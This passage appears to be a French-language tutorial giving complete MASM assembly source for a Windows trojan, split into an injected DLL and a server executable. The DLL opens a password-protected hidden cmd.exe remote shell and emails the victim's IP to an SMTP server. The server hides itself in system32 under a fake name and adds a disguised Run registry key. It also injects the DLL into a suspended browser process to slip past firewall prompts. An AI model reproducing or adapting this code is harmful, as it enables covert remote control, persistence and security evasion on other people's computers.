+	Rol AX, 8			; elle réalise en réalité ces deux opérations ( Mov EAX, Port_Cmd / Rol AX, 8 )
+	Mov SockAdress.sin_port, AX	; on remplit la structure pour notre futur socket qui écoute avec le resultat
+	Mov SockAdress.sin_family, AF_INET	; On définit le type de socket
+	Mov SockAdress.sin_addr, INADDR_ANY	; n'importe qui peut acceder a notre socket futur
+
+	@AcceptLoop:
+	Push hClientSock
+	Call closesocket		; on sait jamais, si il y a eu une connexion, on ferme le socket, ca evite les bugs.
+		
+	Push SIZEOF SockAdress
+	Push OFFSET SockAdress ; on bind notre socket, on le crée donc et il est spécifié sur le port spécifié aussi,
+	Push hSockListen	   ; bref, tout le blabla, il commence a vraiment prendre forme.
+	Call bind			
+
+	Push SOMAXCONN		; on prend le maximum de connexions possibles
+	Push hSockListen
+	Call listen			; Yeah, on le met en écoute !
+	
+	Push 0
+	Push 0
+	Push hSockListen
+	Call accept		 ; on attend pour une connexion :] Soyons patients :]
+	Mov  hClientSock, EAX	; On bouge un handle du socket distant, de EAX vers a variable hClientSock
+	
+	Push OFFSET sz_Present
+	Call lstrlen	; on envoie les phrases "bienvenue dans machin machin, blabla ..", donc, on calcule sa taille
+	
+	Push 0
+	Push EAX
+	Push OFFSET sz_Present
+	Push hClientSock
+	Call send 	; on l'envoie a celui qui vient de se connecter, le bougre
+	
+	@AskPassword:
+	Push OFFSET sz_EnterPass	; on calcule la taille du "Veuillez entrer votre pass !"
+	Call lstrlen
+	
+	Push 0
+	Push EAX
+	Push OFFSET sz_EnterPass
+	Push hClientSock
+	Call send		; on envoie au gars qui s'est connecté
+	
+	Push 0
+	Push SIZEOF sz_RecvBuffer
+	Push OFFSET sz_RecvBuffer
+	Push hClientSock
+	Call recv	; et, fiers et droits, on attend notre réponse. Autrement, on bouge pas !
+	
+	Cmp  EAX, SOCKET_ERROR	; Sgrouarf, il s'est déconnéecté du port. Bon,
+	Je   @AcceptLoop		; Tant pis, on saute un peu plus haut pour recommencer a écouter pour une connexion
+	
+	Mov EDI, OFFSET sz_RecvBuffer	; Ha, il a entré un pass. On le crypte ...
+	Mov ESI, EDI
+	
+	@Decrypt:
+		Lodsb						; Petite astuce : Au lieu de décrypter en mémoire notre vrai password,
+		Cmp AL, 0					; on prend celui qui est entré, on le crypte. Puis, on le compare avec notre pass déja crypté,
+		Je @Decrypted				; un peu comme le syteme du MD5, ou rien n'est décrypté. 
+		Xor AL, Xor_Key				; On a donc notre vrai pass toujours crypté, que ce soit en mémoire comme "en dur"
+		Stosb
+		Jmp @Decrypt
+	@Decrypted:
+		Stosb
+	
+	Push OFFSET sz_Password
+	Push OFFSET sz_RecvBuffer		; La fameuse comparaison des deux pass cryptés
+	Call lstrcmpi
+		.IF EAX != 0	; Il se paye notre tête, c'est même pas le bon pass !
+			Push OFFSET sz_BadPass
+			Call lstrlen	; On calcule la taille de la phrase qui dit "Bip, pas bon !"
+			
+			Push 0
+			Push EAX
+			Push OFFSET sz_BadPass
+			Push hClientSock
+			Call send		; On envoie au gars connecté
+			
+			Push SIZEOF sz_RecvBuffer
+			Push OFFSET sz_RecvBuffer
+			Call RtlZeroMemory	; On vide le buffer qui a contenu la réponse
+			
+			Jmp @AskPassword	; On redemande le password, en sautant un peu plus haut, a l'endroit ou l'on demande.
+			
+		.ELSE
+			Push SIZEOF sz_RecvBuffer
+			Push OFFSET sz_RecvBuffer
+			Call RtlZeroMemory			; On vide le buffer qui a contenu le password
+				
+			Mov Startup.cb,sizeof STARTUPINFO	; On prépare la structure Startup pour cmd.Exe 
+			Mov Startup.lpReserved,NULL
+			Mov Startup.lpTitle,NULL
+			Mov Startup.lpDesktop,NULL
+			Mov Startup.wShowWindow,SW_HIDE		; Lui, par conte, on le lance en caché !
+			Mov Startup.lpReserved2,NULL
+			Mov Startup.cbReserved2,0
+			Mov ebx,STARTF_USESHOWWINDOW OR STARTF_USESTDHANDLES	; oui, on modifiera les Std Handles
+			Mov Startup.dwFlags,ebx				; On lui dit que l'on a utilisé les flags pour montrer ou non le prog'
+			
+			Mov Sat.nLength, SIZEOF Sat			; On initialise la structure Sat
+			Mov Sat.lpSecurityDescriptor, NULL
+			Mov Sat.bInheritHandle, TRUE		; Oui, les handles sont hérités 
+				
+			Push 0
+			Push OFFSET Sat						; On crée un pipe ( -> tunnel, en gros ), pour renvoyer 
+			Push OFFSET hShellOutShell			; les données sur le socket
+			Push OFFSET hShellOutToSocket
+			Call CreatePipe						
+			
+			Push 0
+			Push OFFSET Sat						; on crée un autre pipe pour les données entrantes
+			Push OFFSET hShellInToSocket
+			Push OFFSET hShellInShell
+			Call CreatePipe
+		
+			Push hShellOutShell					; On dit de renvoyer l'output standart sur un bout du pipe
+		    Pop  Startup.hStdOutput
+		    Push hShellInShell					; L'input sur un autre ..
+		    Pop  Startup.hStdInput
+		    Push hShellOutShell
+		    Pop  Startup.hStdError				; Et les erreurs sur encore un autre
+		        
+		    Push OFFSET ProcInfo
+		    Push OFFSET Startup
+		    Push 0
+		    Push 0
+		    Push 0
+		    Push TRUE
+		    Push 0
+		    Push 0
+		    Push OFFSET sz_Cmd
+		    Push 0
+		    Call CreateProcess				; On finit par lancer le processus cmd.exe, joyeux lurons que nous sommes :]
+		  	
+		  	Push 300
+		  	Call Sleep
+		  	
+			Push hShellInShell				; On ferme le handle vers le premier pipe, sinon le tout foire
+			Call CloseHandle				; ( oui, car dans ce cas le pipe a, pour une seule sortie, 2 bouts d'écriture
+											; ou lecture .. par conséquent, ça marchera pas. )
+			Push hShellOutShell				; On ferme donc les handles des pipes, mais ceux vers cmd.exe sont toujours actif :]
+			Call CloseHandle
+			
+			Push 300
+			Call Sleep
+			
+			@loop:
+			.WHILE TRUE 
+				Push 100
+				Call Sleep
+				
+				Push 0
+				Push 0
+				Push OFFSET sz_BytesRead ; On regarde s'il y a des données a grapiller sur l'entrée du pipe, vers le socket
+				Push SIZEOF sz_Buffer	; a noter que cette fonction ne retire pas les données du pipe, elles restent en attente
+				Push OFFSET sz_Buffer	; on obtient juste combien il y a de données a prendre
+				Push hShellOutToSocket
+				Call PeekNamedPipe			
+				
+					.WHILE sz_BytesRead > 0
+						Push OFFSET sz_Buffer
+						Call lstrlen		; on calcule combien la fonction a retourné, et combien on doit lire
+											; tant qu'il y a des données a lire, on repete les opérations qui suivent.
+						Push 0
+						Push OFFSET sz_BytesRead
+						Push EAX				; On lit sur le pipe, a la différence que cette API retire les données en attente
+						Push OFFSET sz_Buffer	; du pipe
+						Push hShellOutToSocket
+						Call ReadFile		
+							.IF EAX == TRUE
+								Push OFFSET sz_Buffer
+								Call lstrlen			; on calcule quelle taille fait le buffer
+								
+						   		Push 0
+						   		Push EAX
+						   		Push OFFSET sz_Buffer
+		   						Push hClientSock		; et on envoie tout ca au client !
+		   						Call send
+		   						
+		   						Push 80000
+		   						Push OFFSET sz_Buffer	; on remet a zero le buffer :]
+		   						Call RtlZeroMemory
+						.ELSE
+							.break
+						.ENDIF
+						Push 20
+						Call Sleep
+		
+						Push 0
+						Push 0
+						Push OFFSET sz_BytesRead
+						Push 0
+						Push 0
+						Push hShellOutToSocket
+						Call PeekNamedPipe	; On regarde s'il y a encore des données a lire, et on recommence si oui.
+					.ENDW
+				Push 0
+				Push SIZEOF sz_RecvBuffer
+				Push OFFSET sz_RecvBuffer
+				Push hClientSock		; on attend un envoi de la part du client, afin de réagir en conséquence
+				Call recv
+				   	.IF EAX == 0			; si on envoie rien
+		             	.BREAK
+		           	.ELSEIF EAX == SOCKET_ERROR	; ou si le client s'est déco
+		             	.BREAK				; on sort de la boucle
+		           	.ENDIF
+		           	
+		        Push OFFSET sz_RecvBuffer
+		        Push OFFSET sz_Exit
+		        Call lstrcmpi       		; On compare, l'utilisateur a-t-il tapé "exit" ?
+		     		.IF EAX == 0				; Oui ? Alors on l'envoie au shell
+		     			Push 0						; ca aura pour effet de le faire quitter.
+		     			Push OFFSET sz_BytesWritten
+		     			Push SIZEOF sz_RecvBuffer
+		     			Push OFFSET sz_RecvBuffer
+		     			Push hShellInToSocket
+		     			Call WriteFile
+		     			
+				     	Jmp @EndLoop			; on saute a "@EndLoop" ( voir plus bas )
+		     		.ENDIF
+		     
+		     	Push OFFSET sz_RecvBuffer		; on calcule quelle taille ça fait, ce que l'on a recu
+		     	Call lstrlen
+		
+		     	Push 0
+		     	Push OFFSET sz_BytesWritten		; on l'envoit au shell
+		     	Push EAX
+		     	Push OFFSET sz_RecvBuffer
+		     	Push hShellInToSocket
+		     	Call WriteFile
+		          	.IF EAX == 0				; ark, ca a foiré, ou alors on a rien tapé
+		                 .BREAK					; on sort de la boucle
+		          .ENDIF
+		       @next:
+		       Push OFFSET sz_RecvBuffer		; on calcule quelle taille fait ce qu'on a recu
+		       Call lstrlen
+		
+		       Push EAX							; on  vide le buffer en conséquence.
+		       Push OFFSET sz_RecvBuffer
+		       Call RtlZeroMemory
+			.ENDW
+			
+		    @EndLoop:						; Voici ou l'on atterit si l'on sort de la boucle, ou que l'on a tapé exit
+		    Push 0							; au cas ou, si c'est pas déja fait on quitte cmd.exe
+		    Push ProcInfo.hProcess
+		    Call TerminateProcess
+		    
+		    Push SIZEOF sz_RecvBuffer		; on vide les buffers
+		    Push OFFSET sz_RecvBuffer
+		    Call RtlZeroMemory
+		    
+		    Push SIZEOF sz_Buffer
+		    Push OFFSET sz_Buffer
+		    Call RtlZeroMemory
+		        
+			Push hClientSock		; on ferme les sockets
+			Call closesocket
+		    
+			Push hSockListen
+			Call closesocket
+			
+			Call WSACleanup			; on décharge Winsock
+			
+			Push hShellOutToSocket		; on supprime les pipes ( on fait le ménage partout, en fait )
+			Call DisconnectNamedPipe
+			
+			Push hShellInToSocket
+			Call DisconnectNamedPipe
+			
+			Push hShellInShell
+			Call DisconnectNamedPipe
+			
+			Push hShellOutShell
+			Call DisconnectNamedPipe
+			
+			Push 200				; on attend 0.2 seconde
+			Call Sleep
+			Jmp @The_Beginning		; et on retourne au début ! Voici donc notre petite fonction de remote shell terminée, et fonctionnelle :]
+		.ENDIF
+ Jmp @The_Beginning
+_ListenThread EndP
+
+
+DllEntry proc hInstance:HINSTANCE, reason:DWORD, reserved1:DWORD
+	.if reason==DLL_PROCESS_ATTACH		; Voici l'endroit ou l'on arrive lors du chargement de la DLL
+		Push 1000
+		Call Sleep						; on attend 1 seconde
+		
+		Push OFFSET TID
+		Push 0
+		Push 0
+		Push OFFSET _Notification
+		Push 0
+		Push 0
+		Call CreateThread				; on crée un nouveau thread qui se charge de la notif' Mail
+		
+		Push OFFSET TID
+		Push 0
+		Push 0
+		Push OFFSET _ListenThread
+		Push 0
+		Push 0
+		Call CreateThread				; on crée un nouveau thread qui se charge du remote shell :]
+		
+		Push 2000
+		Call Sleep
+		
+	.elseif reason== DLL_PROCESS_DETACH		; Ha, on doit décharger la DLL ?
+		Push 2000
+		Call Sleep
+		
+		Push OFFSET sz_DllName
+		Call LoadLibrary					; Pas de prob', on attend 2 secondes, et on la recharge :P
+		
+	.endif
+		Mov EAX, TRUE
+		Ret
+DllEntry Endp
+
+_Notification Proc
+LOCAL Tstatus:RASCONNSTATUS
+	Xor  EBX, EBX				; on met le registre EBX a 0
+	Mov EDI, OFFSET sz_Helo		; procédure pour décrypter les données pour le serveur SMTP, c'est a dire tout le tintouin :
+	Mov ESI, EDI				; helo smtp.mail.com
+								; mail from: <envoyeur@mail.com> ... etc ...
+	@Decrypt1:
+		Lodsb
+		Cmp AL, 0
+		Je @Decrypted1
+		Xor AL, Xor_Key
+		Stosb
+		Jmp @Decrypt1
+	@Decrypted1:
+		Stosb
+	
+	Mov EDI, OFFSET sz_SmtpServer	; Avant de vouloir envoyer le mail, il serait bon de savoir a quel serveur
+	Mov ESI, EDI					; il faut se connecter, non ? Donc, on décrypte le serveur SMTP. :]
+	
+	@Decrypt:
+		Lodsb
+		Cmp AL, 0
+		Je @Decrypted
+		Xor AL, Xor_Key
+		Stosb
+		Jmp @Decrypt
+	@Decrypted:
+		Stosb
+		
+
+@Begin:										; Petite procédure pour verifier si on est connecté a internet ou pas :)
+Mov  DWORD PTR Tstatus.dwSize, 160
+Mov  Tr_Connection.dwSize, SIZEOF RASCONN + 1
+Mov  RasCon_Buf, SIZEOF Tr_Connection
+
+Invoke RasEnumConnections, ADDR Tr_Connection.dwSize, ADDR RasCon_Buf, ADDR hCon
+
+.IF EAX != 0	
+	Push 2000
+	Call Sleep
+	
+	JMP @Begin
+.ENDIF
+
+Invoke RasGetConnectStatus, Tr_Connection.hrasconn, ADDR Tstatus
+
+.IF Tstatus.rasconnstate == 2000h	; Ha, on est connectés au net !
+	.IF EBX == 0				; on est pas encore passé par la, on a pas envoyé le mail .. si EBX == 0, pas encore eu connexion ni envoi de mail
+		JMP @Connected			; on saute a la procédure "@Connected"
+	.ELSEIF EBX == 1			; on a déja envoyé le mail ! Si EBX == 1, il y a eu connexion et donc envoi du mail, on est déja passé par la !
+		JMP @WaitLong			; on va a la procédure WaitLong
+	.ENDIF
+.ELSEIF Tstatus.rasconnstate != 2000h	; Ha, ben on est pas connectés .. dommage
+	.IF EBX == 0				; On est pas encore passé la, on a donc pas envoyé le mail .. EBX == 0 => pas connecté, pas de mail envoyé 
+		JMP @Wait				; on va a la procédure Wait
+	.ELSEIF EBX == 1			; Oui, on est déja passé la, et on a déja envoyé le mail. EBX == 1, pas connecté, mais mail envoyé. 
+		Mov EBX, 0				; on remet EBX a 0, pour dire "Hey gars, on est plus connecté"
+		JMP @Wait				; On saute a "Wait"
+	.ENDIF						; Dans cette procédure de test, on utilise EBX en tant que marqueur de connexion :
+.ENDIF							; plus tard, après envoi du mail, on met EBX a 1, et l'on test ici sa valeur.
+JMP @Wait						; S'il est egal a 1, alors on a envoyé un mail, c'est déja fait.
+
+@Wait:
+Push 5000					; on attend 5 sec
+Call Sleep		
+JMP  @Begin					; on retest pour la connexion
+
+@WaitLong:
+Push 300000					; on attend treeees longtemps
+Call Sleep
+
+JMP @Begin					; et on retest la connexion :]
+
+@Connected:
+
+Push OFFSET sz_WsaData	; on met en route Winsock pour la création de socket et tout le tintouin
+Push 101h
+Call WSAStartup
+
+Push 256
+Push OFFSET sz_LocalHostname	; petite procédure afin de récuperer l'IP locale
+Call gethostname				; on prend l'hostname du PC local
+
+Push OFFSET sz_LocalHostname	; on tente de récuperer le nom du PC local; enfin, son IP
+Call gethostbyname
+
+Mov EBX, EAX					; on bouge le résultat dans EBX
+
+Assume  EBX: PTR hostent		; petite astuce, pour lister le tout
+Mov EAX, [EBX].h_list
+
+Assume EBX: nothing
+
+Mov EBX, EAX
+Mov EAX, [EBX]
+Mov EAX, [EAX]
+Push EAX
+Call inet_ntoa				; on obtient alors un numero que l'on passe a inet_ntoa
+							; qui nous retourne un offset vers l'IP en version "aaa.bbb.ccc.ddd"
+Push EAX
+Push OFFSET sz_VicIP		; on bouge donc l'IP dans le buffer sz_VicIP
+Call lstrcat
+
+Push OFFSET sz_Helo
+Push OFFSET sz_ToSend		; on bouge tout le "helo smtp.mail.com, mail from: ... data ... IP De la Victime :" dans sz_ToSend
+Call lstrcat
+
+Push OFFSET sz_VicIP		; on y ajoute l'IP
+Push OFFSET sz_ToSend		; on a donc "IP de la Victime : aaa.bbb.ccc.ddd"
+Call lstrcat
+
+Push OFFSET sz_EndToSend
+Push OFFSET sz_ToSend		; fin de la sequence SMTP, histoire de terminer le tout et envoyer le mail
+Call lstrcat
+
+@GetHost:
+Push OFFSET sz_SmtpServer
+Call inet_addr				;  On tente d'obtenir l'adresse network du serveur STMP, si c'est une IP
+
+.IF EAX == INADDR_NONE		; Hmm .. ça n'a pas marché. Donc, l'utilisateur a fourni un nom du type smtp.mail.com, et non une IP
+Push OFFSET sz_SmtpServer
+Call gethostbyname			; on cherche donc son numero a partir du DNS
+	.IF EAX == 0			; ca n'a pas marché .. on attend une seconde, et on reessaye
+	Push 1000
+	Call Sleep
+	Jmp  @GetHost
+	.ENDIF
+Mov EAX, [EAX+12]			; ca a marché ? Youpi, donc, on s'arrange pour obtenir un numero valable
+Mov EAX, [EAX]
+Mov EAX, [EAX]
+.ENDIF
+Mov  SockAdress.sin_addr, EAX	; allez, on a enfin le resultat, et donc, le numero network du SMTP 
+Mov SockAdress.sin_family, AF_INET	; on met le type du socket
+Mov EAX, Port_Smtp			; on obtient le port du SMTP, grace a notre simili-htons
+Rol AX, 8
+Mov SockAdress.sin_port, AX	; on stoque le résultat
+
+Push 0
+Push SOCK_STREAM
+Push AF_INET
+Call socket			; on crée enfin notre socket !
+
+Mov hSock, EAX
+
+Push SIZEOF SockAdress
+Push OFFSET SockAdress
+Push hSock
+Call bind			; on le bind, pour le faire "exister", comme vu plus haut
+
+@TestConnect:
+Push SIZEOF SockAdress
+Push OFFSET SockAdress
+Push hSock
+Call connect		; on tente une connexion au serveur SMTP
+
+	.IF EAX == SOCKET_ERROR	; bah mince, ca marche pas
+		Push 1000
+		Call Sleep
+		
+		Jmp @TestConnect	; on recommence :]
+	.ENDIF
+
+Push OFFSET sz_ToSend
+Call lstrlen
+
+Push 0
+Push EAX
+Push OFFSET sz_ToSend	; on envoie le tout dans le serveur STMP, c'est a dire tout ce qui est "helo smtp.mail.com .. data 
+Push hSock				; ... IP de la Victime ... goodbye .. quit"
+Call send			
+
+Push hSock
+Call closesocket		; on referme le socket
+Mov EBX, 1				; on met EBX a 1 histoire de pouvoir dire "Nous avons envoyé le mail, nous étios connectés, ça marche"
+JMP @Begin				; et on recommence le tout ! :D
+
+_Notification Endp
+
+End DllEntry
+
+
+
+	- fin d'Injected_Dll.asm
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	- Server.asm
+
+
+.386
+.model flat,stdcall
+option casemap:none
+
+;Includes
+include \masm32\include\windows.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\masm32.inc
+include \masm32\include\rasapi32.inc
+include \masm32\include\advapi32.inc
+include \masm32\include\shell32.inc
+include \masm32\include\wsock32.inc
+
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\shell32.lib
+includelib  \masm32\lib\masm32.lib
+includelib \masm32\lib\rasapi32.lib
+includelib \masm32\lib\advapi32.lib
+includelib \masm32\lib\wsock32.lib
+
+.data 
+KeyToLoad		DB 		"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
+NameOfKey		DB		"Gestionnaire de disques universel",0
+sz_NewFile		DB		"sysoobe.exe",0
+sz_NewDir		DB		"\system32\oobe\",0
+sz_Shell		DB		"\system32\cmd.exe",0
+sz_DllName		DB		"ws_sk32.dll",0
+sz_TestFile		DB		"just_for_find_browser.html",0
+
+.data? 
+Startup			STARTUPINFO<>
+ProcInfo		PROCESS_INFORMATION<>
+sz_CurFilePath	DB 300 DUP(?)
+sz_FileDir		DB 300 DUP(?)
+
+;Variables "gardees"
+sz_Browser		DB 500 dup(?)
+LoadKey_Val		DB 200 DUP(?)
+sz_SysDir		DB 300 DUP(?)
+sz_RcpFilePath	DB 300 DUP(?)
+; -------------
+sz_BytesWritten DD ?
+LoadKey_Buf		DD ?
+hKey			DD ?
+hTemp			DD ?
+hModule			DD ?
+hNewModule		DD ?
+sz_Size			DD ?
+hRes			DD ?
+hFile			DD ?
+hInstance	 	DD ?
+TID				DD ?
+
+.code
+
+InjectedThread proc			; Voici le  thread que l'on va injecter, et qui dit "charge la DLL bonhomme !"
+	Push OFFSET sz_CurFilePath
+	Call LoadLibrary
+	Ret
+InjectedThread EndP
+
+start:
+Push 0
+Call GetModuleHandle			; on récupere un handle vers notre processus
+
+Mov  hInstance, EAX
+
+Push 256 
+Push OFFSET sz_CurFilePath
+Push hInstance
+Call GetModuleFileName			; on regarde ou on est
+
+Push 100
+Push OFFSET sz_FileDir 
+Call GetWindowsDirectory 		; on récupere le dossier Windows, disons C:\Windows
+
+Push OFFSET sz_FileDir
+Push OFFSET sz_SysDir
+Call lstrcat					; On le copie dans sz_Sysdir
+
+Push OFFSET sz_NewDir
+Push OFFSET sz_SysDir			; On concatene C:\Windows et la variable sz_NewDir, donc :
+Call lstrcat					; C:\Windows\system32\oobe
+
+Push OFFSET sz_SysDir
+Push OFFSET sz_RcpFilePath		; on Copie la variable sysDir dans RcpFilePath
+Call lstrcat
+
+Push OFFSET sz_NewFile			; on y ajoute la variable NewFile, donc, sysoobe.exe
+Push OFFSET sz_RcpFilePath		; Donc, RcpFilePath = C:\Windows\System32\oobe\sysoobe.exe
+Call lstrcat
+
+Push OFFSET sz_RcpFilePath
+Push OFFSET sz_CurFilePath		; On compare avec notre chemin actuel, tiens :]
+Call lstrcmpi
+
+.IF EAX != 0	; Argh, c'est pas la même chose ! On est donc pas dans le bon dossier !
+	Push 0
+	Push OFFSET sz_SysDir
+	Call CreateDirectory	; Melt Serveur activé :P
+
+	Push MOVEFILE_REPLACE_EXISTING
+	Push OFFSET sz_RcpFilePath
+	Push OFFSET sz_CurFilePath	; On bouge notre fichier dans le bon dossier, sous le nom sysoobe.exe, dans le dossier oobe de System32
+	Call MoveFileEx
+	
+	Push SW_SHOW
+	Push 0				; On l'execute, malin que nous sommes. En SW_SHOW, car de cette manière,
+	Push 0				; Nous n'aurons pas l'avertissement d'un programme lancé en mode caché
+	Push OFFSET sz_RcpFilePath
+	Push 0
+	Push 0
+	Call ShellExecute	
+	
+	Push 0
+	Call ExitProcess
+
+.ENDIF
+	Push FILE_ATTRIBUTE_SYSTEM
+	Push OFFSET sz_RcpFilePath
+	Call SetFileAttributes	; On met les attributs système a notre ficheir serveur, histoire de dissuader l'utilisateur lambda
+	
+	Push OFFSET hKey
+	Push KEY_ALL_ACCESS
+	Push 0
+	Push OFFSET KeyToLoad
+	Push HKEY_LOCAL_MACHINE
+	Call RegOpenKeyEx		; On crée notre clée de run
+	
+	Mov  LoadKey_Buf, 100
+	
+	Push OFFSET LoadKey_Buf
+	Push OFFSET LoadKey_Val
+	Push 0
+	Push 0
+	Push OFFSET NameOfKey
+	Push hKey
+	Call RegQueryValueEx	; On regarde, notre clée est déja présente ? On prend la valeur !
+
+	Push OFFSET LoadKey_Val
+	Push OFFSET sz_CurFilePath
+	Call lstrcmp			; On compare ce qu'elle est avec ce qu'elle DEVRAIT etre
+	
+	.IF EAX ==0				; C'est OK, Chef !
+	JMP @BeginProc			; On va direct a la procédure d'injection ( ca fait un peu jeu de role, je sais )
+	.ENDIF
+
+	Push OFFSET sz_CurFilePath
+	Call lstrlen			; On calcule la longueur de notre chemin de fichier
+	
+	Inc  EAX				; On ajoute le caractere 0, qui termine la variable
+	
+	Push EAX
+	Push OFFSET sz_CurFilePath
+	Push REG_SZ
+	Push 0
+	Push OFFSET NameOfKey
+	Push hKey	
+	Call RegSetValueEx	; Nous rendons justice et on remet la bonne valeur a la clée de registre
+	
+	Push hKey
+	Call RegCloseKey	; on ferme le handle vers la clée de registre
+
+@BeginProc:
+Push OFFSET sz_SysDir			; On place notre dossier d'execution dans Windows\System32\oobe, 
+Call SetCurrentDirectory		; qui était auparavant le dossier d'execution du PREMIER serveur 
+
+Push 0
+Push FILE_ATTRIBUTE_NORMAL
+Push CREATE_ALWAYS
+Push 0
+Push 0
+Push GENERIC_READ+GENERIC_WRITE
+Push OFFSET sz_DllName
+Call CreateFile					; Procédure pour extraire la DLL que l'on compte injecter :]
+Mov	 hFile, EAX					; On bouge le handle dans la variable hFile
+
+Push RT_RCDATA
+Push 1111
+Push 0
+Call FindResource				; On la localise dans les resources
+
+Mov  hTemp, EAX
+
+Push EAX
+Push 0
+Call LoadResource				; On la charge
+
+Mov  hRes, EAX
+
+Push hTemp
+Push 0
+Call SizeofResource				; On calcule sa taille :]
+
+Push 0
+Push OFFSET sz_BytesWritten
+Push EAX
+Push hRes
+Push hFile
+Call WriteFile					; On écrit le fichier en entier, on obtient donc joyeusement notre dll toute prete et fraiche :)
+
+Push hFile
+Call CloseHandle				; on ferme le handle, pour pouvoir se servir de la DLL comme on le souhaite
+
+Push SIZEOF sz_CurFilePath
+Push OFFSET sz_CurFilePath
+Call RtlZeroMemory				; on vide le buffer qui contient le chemin du fichier sysoobe.exe
+
+Push OFFSET sz_SysDir
+Push OFFSET sz_CurFilePath		; on place le chemin C:\Windows\system32\oobe dans ce buffer
+Call lstrcat
+
+Push OFFSET sz_DllName
+Push OFFSET sz_CurFilePath		; on y ajoute notre nom de dll ! Soyons fous ! 
+Call lstrcat					; C:\Windows\System32\oobe\ws_sk32.dll
+
+Push 0
+Push FILE_ATTRIBUTE_NORMAL
+Push CREATE_ALWAYS
+Push 0
+Push 0
+Push GENERIC_WRITE+GENERIC_READ
+Push OFFSET sz_TestFile
+Call CreateFile					; On crée un fichier .html, nommé just_for_find_browser.html
+
+Push EAX
+Call CloseHandle				; on ferme son handle
+
+Push OFFSET sz_Browser			; on récupere le chemin du programme qui sert a l'ouvrir 
+Push 0							; ( normalement le browser par défaut .. on commence a voir l'ébauche de l'injection :P )
+Push OFFSET sz_TestFile			; Petite note, si le programme par défaut pour ouvrir les .html est le bloc note, 
+Call FindExecutable				; on aura l'air malin, mais c'est pas grave :P
+	
+Push OFFSET sz_TestFile
+Call DeleteFile					; on supprime ce fichier .html, qui est resté affiché environ une demi seconde.. rapide. :]
+									; On prépare la structure Startup pour le lancement du browser
+Mov Startup.cb,sizeof STARTUPINFO	; On dit "la taille de cette structure est la taille de la structure STARTUPINFO
+Mov Startup.lpReserved,NULL			; C'est une variable obligee, on y coupe pas .. donc on met 0
+Mov Startup.wShowWindow,SW_SHOW		; On dit "Okay, au lancement, tu AFFICHES le browser, on le met pas en hidden !"
+Mov Startup.lpReserved2,NULL		; même chose qu'avec reserved, on y coupe pas
+Mov Startup.dwFlags,STARTF_USESHOWWINDOW ; on dit "Hey, on a mis un truc dans la partie wShowWindow, prend le en compte"
+
+Push OFFSET ProcInfo				; On met les résultats dans la structure ProcInfo
+Push OFFSET Startup					; on utilise la structure Startup pour lancer le programme
+Push 0
+Push 0
+Push CREATE_SUSPENDED				; on lancel e programme, oui, mais on le lance en pause .. huhu ..
+Push TRUE							; puisqu'il est affiché en mode pause, aucune fenêtre ne sera affichée,
+Push 0								; et le firewall ne dira pas que le navigateur a été lancé en mode hidden
+Push 0								; petite astuce pour le fun, quoi :]
+Push OFFSET sz_Browser
+Push 0
+Call CreateProcess					; on finit par le lancer, ce satané browser
+
+Push 0
+Call GetModuleHandle				; procédure d'injection qui commence .. on récupere un handle pour notre prcessus
+
+Mov    hModule, eax					; on le met dans hModule
+Mov    EDI, EAX 					; on bouge le contenu de EAX dans EDI
+Assume EDI:ptr IMAGE_DOS_HEADER 	; on suppose que EDI pointe vers la section IMAGE_DOS_HEADER du PE de notre fichier
+Add    EDI, [EDI].e_lfanew			; On se positionne sur le bon endroit, et on calcule la taille necessaire	
+Add    EDI, sizeof dword
+Add    EDI, sizeof IMAGE_FILE_HEADER
+Assume EDI:ptr IMAGE_OPTIONAL_HEADER32 ; Autre section du PE Header
+Mov    EAX, [EDI].SizeOfImage
+mov    sz_Size, EAX					; Et l'on obtient ici la taille que l'on compte injecter :] Magique :]
+Assume EDI:NOTHING					; On dit que EDI ne vaut plus rien maintenant.
+
+Push MEM_RELEASE
+Push 0
+Push hModule
+Push ProcInfo.hProcess
+Call VirtualFreeEx				; On libere de l'espace mémoire dans la mémoire du browser lancé, qui attend, mine de rien
+
+Push PAGE_EXECUTE_READWRITE
+Push MEM_COMMIT + MEM_RESERVE
+Push sz_Size
+Push hModule
+Push ProcInfo.hProcess
+Call VirtualAllocEx				; on alloue l'espace mémoire necessaire a notre injection :]
+Mov  hNewModule, EAX
+
+Push OFFSET sz_BytesWritten
+Push sz_Size
+Push hModule
+Push hNewModule
+Push ProcInfo.hProcess
+Call WriteProcessMemory			; On y écrit tout ce dont on a besoin pour l'injection, comme la taille, le processus, tout ca ..
+
+Push OFFSET TID
+Push 0
+Push hModule
+Push OFFSET InjectedThread	; Youpi, tout est pret ! On crée donc un thread dans le browser, thread qui est celui décrit plus haut ..
+Push 0						; .. et qui charge notre DLL en mémoire :] On a donc notre injection de prête ...et executée.
+Push 0						
+Push ProcInfo.hProcess
+Call CreateRemoteThread		
+
+Push 0
+Call ExitProcess			; On quitte le programme .Exe, qui ne sert plus a rien, du coup.
+
+
+end start
+
+
+
+
+
+
+
+    -- [ Icingtaupe.
